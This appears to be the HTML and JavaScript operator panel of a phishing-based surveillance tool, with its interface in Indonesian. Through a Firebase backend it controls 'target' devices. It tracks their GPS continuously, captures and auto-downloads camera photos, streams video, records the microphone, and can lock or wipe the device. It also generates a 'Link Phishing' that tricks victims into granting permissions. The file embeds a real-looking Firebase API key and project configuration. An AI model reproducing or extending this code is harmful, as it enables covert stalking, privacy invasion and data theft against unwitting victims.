<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Monitoring System</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        :root {
            --bg: #0d1117;
            --card: #161b22;
            --border: #30363d;
            --text: #c9d1d9;
            --accent: #58a6ff;
            --green: #3fb950;
            --red: #f85149;
            --yellow: #d2991d;
            --orange: #ff8c00;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: var(--bg);
            color: var(--text);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            font-size: 14px;
            line-height: 1.5;
        }
        .app { display: flex; height: 100vh; }
        
        .sidebar {
            width: 320px;
            background: var(--card);
            border-right: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        .sidebar-header {
            padding: 16px;
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .logo { font-size: 20px; font-weight: 700; color: #fff; }
        .badge { background: var(--green); color: #000; font-size: 11px; padding: 2px 8px; border-radius: 10px; font-weight: 600; }
        .search-box { padding: 12px 16px; border-bottom: 1px solid var(--border); }
        .search-box input {
            width: 100%;
            background: var(--bg);
            border: 1px solid var(--border);
            color: var(--text);
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 13px;
        }
        .search-box input:focus { outline: none; border-color: var(--accent); }
        .device-list { flex: 1; overflow-y: auto; padding: 8px; }
        .device-card {
            background: var(--bg);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 8px;
            cursor: pointer;
            transition: all 0.2s;
            position: relative;
        }
        .device-card:hover { border-color: var(--accent); }
        .device-card.selected { border-color: var(--accent); background: #1a2332; }
        .device-card .name { font-weight: 600; color: #fff; font-size: 15px; }
        .device-card .meta { font-size: 12px; color: #8b949e; margin-top: 4px; }
        .device-card .dot {
            width: 8px; height: 8px;
            border-radius: 50%;
            position: absolute;
            top: 12px; right: 12px;
        }
        .dot.online { background: var(--green); box-shadow: 0 0 8px var(--green); }
        .dot.offline { background: var(--red); }
        .device-card .error-indicator {
            position: absolute;
            top: 12px; right: 28px;
            color: var(--orange);
            font-size: 12px;
            display: none;
        }
        
        .main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
        .topbar {
            padding: 12px 20px;
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: var(--card);
        }
        .topbar h2 { font-size: 18px; font-weight: 600; color: #fff; }
        .btn {
            padding: 6px 14px;
            border: 1px solid var(--border);
            background: var(--bg);
            color: var(--text);
            border-radius: 6px;
            cursor: pointer;
            font-size: 13px;
            transition: all 0.2s;
            white-space: nowrap;
        }
        .btn:hover { border-color: var(--accent); color: #fff; }
        .btn.primary { background: #238636; border-color: #238636; color: #fff; }
        .btn.primary:hover { background: #2ea043; }
        .btn.danger { background: #da3633; border-color: #da3633; color: #fff; }
        .btn.danger:hover { background: #f85149; }
        .btn.warn { background: #9a6700; border-color: #d2991d; color: #fff; }
        .btn.small { padding: 3px 10px; font-size: 11px; }
        
        .content {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
        }
        .card {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 16px;
        }
        .card.full { grid-column: 1 / -1; }
        .card-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 12px;
            padding-bottom: 8px;
            border-bottom: 1px solid var(--border);
        }
        .card-header h3 { font-size: 14px; font-weight: 600; color: #fff; }
        
        #map { height: 280px; border-radius: 6px; border: 1px solid var(--border); }
        .info-row { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 6px; }
        .info-tag {
            background: var(--bg);
            border: 1px solid var(--border);
            padding: 3px 10px;
            border-radius: 4px;
            font-size: 12px;
        }
        .info-tag span { color: #8b949e; }
        .info-tag strong { color: #fff; }
        
        .camera-area {
            text-align: center;
            min-height: 200px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #000;
            border-radius: 6px;
            border: 1px solid var(--border);
            overflow: hidden;
            position: relative;
        }
        .camera-area img, .camera-area video {
            max-width: 100%;
            max-height: 260px;
            border-radius: 6px;
        }
        
        .log-box {
            background: #000;
            border: 1px solid var(--border);
            border-radius: 6px;
            padding: 10px;
            height: 180px;
            overflow-y: auto;
            font-size: 12px;
            font-family: 'SF Mono', 'Fira Code', monospace;
            color: #7ee787;
        }
        .log-box .entry { margin-bottom: 3px; }
        .log-box .time { color: #8b949e; }
        .log-box .warn { color: var(--orange); }
        .log-box .error { color: var(--red); }
        
        .notif-toast {
            position: fixed;
            bottom: 20px; right: 20px;
            padding: 12px 20px;
            border-radius: 8px;
            color: #fff;
            font-weight: 600;
            z-index: 9999;
            animation: slideIn 0.3s ease;
            max-width: 380px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
        }
        .notif-toast.success { background: #238636; border: 1px solid #3fb950; }
        .notif-toast.error { background: #da3633; border: 1px solid #f85149; }
        .notif-toast.warning { background: #9a6700; border: 1px solid #d2991d; }
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        .cmd-row { display: flex; gap: 6px; margin-bottom: 8px; flex-wrap: wrap; }
        .cmd-row input {
            flex: 1;
            min-width: 100px;
            background: var(--bg);
            border: 1px solid var(--border);
            color: var(--text);
            padding: 6px 10px;
            border-radius: 4px;
            font-size: 12px;
        }
        .cmd-row input:focus { outline: none; border-color: var(--accent); }
        
        .empty-state { text-align: center; padding: 60px 20px; color: #8b949e; }
    </style>
</head>
<body>
    <div class="app">
        <div class="sidebar">
            <div class="sidebar-header">
                <span class="logo">📡 Dashboard</span>
                <span class="badge" id="onlineCount">0 online</span>
            </div>
            <div class="search-box">
                <input type="text" placeholder="Cari device..." id="searchInput" oninput="filterDevices()" />
            </div>
            <div class="device-list" id="deviceList">
                <div class="empty-state"><p>Belum ada device</p></div>
            </div>
        </div>
        
        <div class="main">
            <div class="topbar">
                <h2 id="panelTitle">Pilih device</h2>
                <div class="actions">
                    <button class="btn" onclick="showLinkModal()">🔗 Link</button>
                    <button class="btn primary" onclick="refreshAll()">🔄 Refresh</button>
                </div>
            </div>
            <div class="content" id="detailContent" style="display:none;">
                <div class="card">
                    <div class="card-header">
                        <h3>📱 Info</h3>
                        <button class="btn small" onclick="requestUpdate()">Update</button>
                    </div>
                    <div id="deviceInfo"></div>
                </div>
                <div class="card">
                    <div class="card-header">
                        <h3>📍 Lokasi</h3>
                        <div>
                            <button class="btn small primary" id="trackBtn" onclick="toggleTracking()">▶ Track</button>
                            <button class="btn small" onclick="refreshLocation()">Refresh</button>
                        </div>
                    </div>
                    <div id="map"></div>
                    <div id="locText" style="font-size:12px;margin-top:6px;">-</div>
                </div>
                <div class="card">
                    <div class="card-header">
                        <h3>📸 Kamera</h3>
                        <div>
                            <button class="btn small" onclick="capturePhoto('user')">Selfie</button>
                            <button class="btn small" onclick="capturePhoto('environment')">Belakang</button>
                            <button class="btn small primary" onclick="toggleVideoStream()">Stream</button>
                        </div>
                    </div>
                    <div class="camera-area" id="cameraArea">
                        <span style="color:#8b949e;">Klik tombol ambil gambar</span>
                    </div>
                </div>
                <div class="card">
                    <div class="card-header">
                        <h3>🎤 Audio</h3>
                        <div>
                            <button class="btn small" id="micBtn" onclick="toggleMic()">▶ Rekam</button>
                            <button class="btn small" onclick="downloadAudio()">Unduh</button>
                        </div>
                    </div>
                    <div id="micStatus" style="font-size:12px;margin-bottom:6px;">Mikrofon idle</div>
                    <div class="log-box" id="audioLog">Menunggu...</div>
                </div>
                <div class="card full">
                    <div class="card-header"><h3>⚡ Actions</h3></div>
                    <div class="cmd-row">
                        <button class="btn small" onclick="sendNotif()">Notifikasi</button>
                        <input type="text" id="notifTitle" placeholder="Judul" style="max-width:130px;" />
                        <input type="text" id="notifBody" placeholder="Pesan" style="max-width:200px;" />
                    </div>
                    <div class="cmd-row">
                        <button class="btn small" onclick="openUrl()">Buka URL</button>
                        <input type="text" id="urlInput" placeholder="https://..." />
                    </div>
                    <div class="cmd-row" style="border-top:1px solid var(--border);padding-top:8px;">
                        <button class="btn small danger" onclick="lockScreen()">Kunci</button>
                        <button class="btn small" onclick="vibratePhone()">Getar</button>
                        <button class="btn small danger" onclick="wipeConfirm()">Hapus Data</button>
                    </div>
                </div>
                <div class="card full">
                    <div class="card-header"><h3>📋 Log & Error</h3></div>
                    <div class="log-box" id="activityLog"></div>
                    <div id="errorAlerts" style="margin-top:8px;"></div>
                </div>
            </div>
            <div class="empty-state" id="emptyMain" style="margin-top:80px;">
                <p>👈 Pilih device dari sidebar</p>
            </div>
        </div>
    </div>
    
    <!-- Toast container -->
    <div id="toastContainer"></div>
    
    <script>
        firebase.initializeApp({
            apiKey: "AIzaSyAlMyO9iybb7Zc3-JWpaJTOU6mp7dVZw7A",
            authDomain: "taher-online.firebaseapp.com",
            databaseURL: "https://taher-online-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "taher-online",
            storageBucket: "taher-online.firebasestorage.app",
            messagingSenderId: "254196950669",
            appId: "1:254196950669:web:ea7dc25e29e459e791e4c4"
        });
        
        const db = firebase.database();
        let currentTarget = null;
        let map = null;
        let marker = null;
        let trackingActive = false;
        let allDevices = {};
        
        function toast(msg, type = 'success') {
            const container = document.getElementById('toastContainer');
            const el = document.createElement('div');
            el.className = `notif-toast ${type}`;
            el.textContent = msg;
            container.appendChild(el);
            setTimeout(() => { el.remove(); }, 4000);
        }
        
        function addLog(msg, type = '') {
            const el = document.getElementById('activityLog');
            const time = new Date().toLocaleTimeString();
            el.innerHTML += `<div class="entry ${type}"><span class="time">[${time}]</span> ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }
        
        function loadDevices() {
            db.ref('targets').on('value', (snap) => {
                allDevices = snap.val() || {};
                renderDeviceList();
                updateOnlineCount();
                checkAllErrors();
            });
        }
        
        function checkAllErrors() {
            Object.entries(allDevices).forEach(([id, d]) => {
                if (d.locationError) {
                    toast(`⚠️ ${d.name}: ${d.locationError}`, 'warning');
                }
                if (d.photoError) {
                    toast(`⚠️ ${d.name}: Kamera error - ${d.photoError.message}`, 'error');
                }
                if (d.videoError) {
                    toast(`⚠️ ${d.name}: Stream error - ${d.videoError.message}`, 'error');
                }
                if (d.micError) {
                    toast(`⚠️ ${d.name}: Mic error - ${d.micError.message}`, 'error');
                }
            });
        }
        
        function renderDeviceList(filter = '') {
            const container = document.getElementById('deviceList');
            const devices = Object.entries(allDevices);
            const filtered = devices.filter(([id, d]) => 
                !filter || (d.name || '').toLowerCase().includes(filter.toLowerCase())
            );
            
            if (filtered.length === 0) {
                container.innerHTML = `<div class="empty-state"><p>Tidak ada device</p></div>`;
                return;
            }
            
            container.innerHTML = filtered.map(([id, d]) => {
                const hasError = d.locationError || d.photoError || d.videoError || d.micError;
                return `
                <div class="device-card ${currentTarget === id ? 'selected' : ''}" onclick="selectDevice('${id}')">
                    <div class="dot ${d.online ? 'online' : 'offline'}"></div>
                    <span class="error-indicator" style="display:${hasError ? 'inline' : 'none'}">⚠️</span>
                    <div class="name">${d.name || 'Unknown'}</div>
                    <div class="meta">
                        <span>📱 ${d.deviceModel || 'N/A'}</span>
                        <span>🌐 ${d.ip || '-'}</span>
                    </div>
                    <div class="meta">
                        <span>🕐 ${d.lastSeen || '-'}</span>
                        <span>🔋 ${d.battery || '?'}%</span>
                    </div>
                </div>
                `;
            }).join('');
        }
        
        function filterDevices() {
            renderDeviceList(document.getElementById('searchInput').value);
        }
        
        function updateOnlineCount() {
            const online = Object.values(allDevices).filter(d => d.online).length;
            document.getElementById('onlineCount').textContent = `${online} online`;
        }
        
        function selectDevice(id) {
            currentTarget = id;
            const d = allDevices[id];
            if (!d) return;
            
            document.getElementById('detailContent').style.display = 'grid';
            document.getElementById('emptyMain').style.display = 'none';
            document.getElementById('panelTitle').textContent = d.name || 'Device';
            
            document.getElementById('deviceInfo').innerHTML = `
                <div class="info-row">
                    <span class="info-tag"><span>Model</span> <strong>${d.deviceModel || 'N/A'}</strong></span>
                    <span class="info-tag"><span>OS</span> <strong>${d.deviceOS || 'N/A'}</strong></span>
                    <span class="info-tag"><span>IP</span> <strong>${d.ip || 'N/A'}</strong></span>
                </div>
                <div class="info-row">
                    <span class="info-tag"><span>Baterai</span> <strong>${d.battery || '?'}%</strong></span>
                    <span class="info-tag"><span>Jaringan</span> <strong>${d.network || 'N/A'}</strong></span>
                </div>
                <div class="info-row" style="margin-top:8px;">
                    <span class="info-tag">📍 <strong>${d.permissions?.location ? '✅' : '❌'}</strong></span>
                    <span class="info-tag">📸 <strong>${d.permissions?.camera ? '✅' : '❌'}</strong></span>
                    <span class="info-tag">🎤 <strong>${d.permissions?.microphone ? '✅' : '❌'}</strong></span>
                </div>
            `;
            
            if (d.location && d.location.lat) {
                initMap(d.location.lat, d.location.lon);
                document.getElementById('locText').textContent = 
                    `Lat: ${d.location.lat.toFixed(6)}, Lon: ${d.location.lon.toFixed(6)} · ±${d.location.accuracy || '?'}m`;
            }
            
            document.getElementById('cameraArea').innerHTML = '<span style="color:#8b949e;">Klik tombol ambil gambar</span>';
            document.getElementById('audioLog').innerHTML = 'Menunggu...';
            
            renderDeviceList();
            addLog(`Membuka: ${d.name}`);
            listenPhoto(id);
            listenAudio(id);
            listenErrors(id);
        }
        
        function initMap(lat, lon) {
            if (!map) {
                map = L.map('map').setView([lat, lon], 16);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '© OSM'
                }).addTo(map);
            }
            if (marker) map.removeLayer(marker);
            marker = L.marker([lat, lon]).addTo(map)
                .bindPopup('📍 Lokasi').openPopup();
            map.setView([lat, lon], 16);
        }
        
        function refreshLocation() {
            if (!currentTarget) return;
            sendCmd('getLocation');
            addLog('Request lokasi...');
        }
        
        function toggleTracking() {
            const btn = document.getElementById('trackBtn');
            if (trackingActive) {
                trackingActive = false;
                btn.textContent = '▶ Track';
                addLog('Tracking stop');
            } else {
                trackingActive = true;
                btn.textContent = '⏹ Stop';
                addLog('Tracking aktif (3s)');
                doTrack();
            }
        }
        function doTrack() {
            if (!trackingActive || !currentTarget) return;
            sendCmd('getLocation');
            setTimeout(doTrack, 3000);
        }
        
        function capturePhoto(facingMode) {
            if (!currentTarget) return;
            sendCmd('capturePhoto', { facingMode });
            document.getElementById('cameraArea').innerHTML = '<span style="color:#ffaa00;">📸 Mengambil foto...</span>';
            addLog(`Ambil foto (${facingMode})...`);
        }
        
        function listenPhoto(id) {
            db.ref(`targets/${id}/photo`).off();
            db.ref(`targets/${id}/photo`).on('value', (snap) => {
                const data = snap.val();
                if (data && data.base64) {
                    document.getElementById('cameraArea').innerHTML = 
                        `<img src="${data.base64}" alt="Foto" style="max-width:100%;max-height:260px;border-radius:6px;" />`;
                    addLog('📸 Foto diterima!');
                    toast('✅ Foto berhasil diambil!', 'success');
                    
                    // AUTO DOWNLOAD FOTO
                    autoDownloadPhoto(data.base64, id, data.timestamp);
                }
            });
            
            // Listen error
            db.ref(`targets/${id}/photoError`).off();
            db.ref(`targets/${id}/photoError`).on('value', (snap) => {
                const err = snap.val();
                if (err) {
                    addLog(`❌ Foto error: ${err.message}`, 'error');
                    toast(`⚠️ Foto gagal: ${err.message}`, 'error');
                }
            });
        }
        
        function autoDownloadPhoto(base64, id, timestamp) {
            try {
                const link = document.createElement('a');
                link.href = base64;
                link.download = `photo_${id}_${timestamp || Date.now()}.jpg`;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                addLog('💾 Foto otomatis terdownload');
            } catch(e) {
                addLog(`⚠️ Gagal download: ${e.message}`, 'warn');
            }
        }
        
        function listenAudio(id) {
            db.ref(`targets/${id}/audioRecording`).off();
            db.ref(`targets/${id}/audioRecording`).on('value', (snap) => {
                const data = snap.val();
                if (data && data.base64) {
                    document.getElementById('audioLog').innerHTML = '✅ Rekaman audio tersedia!';
                    toast('🎤 Rekaman audio siap!', 'success');
                }
            });
            
            db.ref(`targets/${id}/micError`).off();
            db.ref(`targets/${id}/micError`).on('value', (snap) => {
                const err = snap.val();
                if (err) {
                    addLog(`❌ Mic error: ${err.message}`, 'error');
                    toast(`⚠️ Mic error: ${err.message}`, 'error');
                }
            });
        }
        
        function listenErrors(id) {
            db.ref(`targets/${id}/locationError`).on('value', (snap) => {
                const err = snap.val();
                if (err) {
                    addLog(`⚠️ GPS Error: ${err}`, 'warn');
                    toast(`⚠️ ${allDevices[id]?.name}: GPS Error!`, 'warning');
                }
            });
            
            db.ref(`targets/${id}/videoError`).on('value', (snap) => {
                const err = snap.val();
                if (err) {
                    addLog(`❌ Stream error: ${err.message}`, 'error');
                    toast(`⚠️ Stream error: ${err.message}`, 'error');
                }
            });
        }
        
        let videoActive = false;
        function toggleVideoStream() {
            if (videoActive) {
                sendCmd('stopVideo');
                videoActive = false;
                document.getElementById('cameraArea').innerHTML = '<span style="color:#8b949e;">Stream stop</span>';
                addLog('Stream stop');
            } else {
                sendCmd('startVideo');
                videoActive = true;
                document.getElementById('cameraArea').innerHTML = '<span style="color:#ffaa00;">📡 Menunggu stream...</span>';
                addLog('Stream start');
                listenVideoStream(currentTarget);
            }
        }
        
        function listenVideoStream(id) {
            db.ref(`targets/${id}/videoFrame`).off();
            db.ref(`targets/${id}/videoFrame`).on('value', (snap) => {
                const data = snap.val();
                if (data && data.base64 && videoActive) {
                    document.getElementById('cameraArea').innerHTML = 
                        `<img src="${data.base64}" alt="Stream" style="max-width:100%;max-height:260px;" />`;
                }
            });
        }
        
        let micActive = false;
        function toggleMic() {
            if (micActive) {
                sendCmd('stopMic');
                micActive = false;
                document.getElementById('micBtn').textContent = '▶ Rekam';
                document.getElementById('micStatus').textContent = 'Mikrofon idle';
                addLog('Rekaman stop');
            } else {
                sendCmd('startMic');
                micActive = true;
                document.getElementById('micBtn').textContent = '⏹ Stop';
                document.getElementById('micStatus').textContent = '🔴 Merekam...';
                addLog('Rekaman mulai');
            }
        }
        
        function downloadAudio() {
            if (!currentTarget) return;
            const d = allDevices[currentTarget];
            if (d && d.audioRecording && d.audioRecording.base64) {
                const link = document.createElement('a');
                link.href = d.audioRecording.base64;
                link.download = `audio_${currentTarget}_${Date.now()}.webm`;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                toast('✅ Audio terdownload!', 'success');
            } else {
                toast('⚠️ Belum ada rekaman', 'warning');
            }
        }
        
        function sendNotif() {
            if (!currentTarget) return;
            sendCmd('notification', {
                title: document.getElementById('notifTitle').value || 'Info',
                body: document.getElementById('notifBody').value || 'Pesan baru'
            });
            addLog('Notif dikirim');
        }
        
        function openUrl() {
            if (!currentTarget) return;
            const url = document.getElementById('urlInput').value;
            if (!url) return;
            sendCmd('openURL', { url });
            addLog(`Buka URL: ${url}`);
        }
        
        function lockScreen() { if (currentTarget) { sendCmd('lock'); addLog('Layar dikunci'); } }
        function vibratePhone() { if (currentTarget) { sendCmd('vibrate'); addLog('Getar'); } }
        function wipeConfirm() {
            if (!currentTarget) return;
            if (confirm('Yakin hapus data?')) {
                sendCmd('wipe');
                addLog('⚠️ Wipe command sent', 'warn');
                toast('⚠️ Perintah hapus dikirim!', 'warning');
            }
        }
        
        function requestUpdate() { if (currentTarget) { sendCmd('updateInfo'); addLog('Update info...'); } }
        function refreshAll() { addLog('Refresh...'); loadDevices(); }
        
        function sendCmd(command, data = {}) {
            if (!currentTarget) return;
            db.ref(`commands/${currentTarget}`).set({ command, ...data, timestamp: Date.now() });
        }
        
        // Link
        function showLinkModal() {
            const link = window.location.href.replace('admin.html', 'index.html').replace(/\/$/, '');
            const r = btoa(Date.now());
            const fullLink = `${link}?r=${r}`;
            
            const modal = document.createElement('div');
            modal.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);z-index:999;display:flex;align-items:center;justify-content:center;';
            modal.innerHTML = `
                <div style="background:#161b22;border:1px solid #30363d;border-radius:12px;padding:24px;max-width:500px;width:90%;">
                    <h3 style="color:#fff;margin-bottom:8px;">🔗 Link Phishing</h3>
                    <p style="color:#8b949e;font-size:13px;margin-bottom:12px;">Target buka index.html → izinkan → redirect ke game.html</p>
                    <input type="text" value="${fullLink}" readonly style="width:100%;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:8px;border-radius:4px;margin-bottom:8px;" id="linkCopy" />
                    <button class="btn primary" style="width:100%;margin-bottom:4px;" onclick="navigator.clipboard.writeText('${fullLink}');alert('Disalin!');">📋 Salin Link</button>
                    <button class="btn" style="width:100%;" onclick="this.closest('[style*=fixed]').remove();">Tutup</button>
                </div>
            `;
            document.body.appendChild(modal);
        }
        
        loadDevices();
        addLog('Dashboard siap.');
        
        // Cek error setiap 30 detik
        setInterval(checkAllErrors, 30000);
    </script>
</body>
</html>
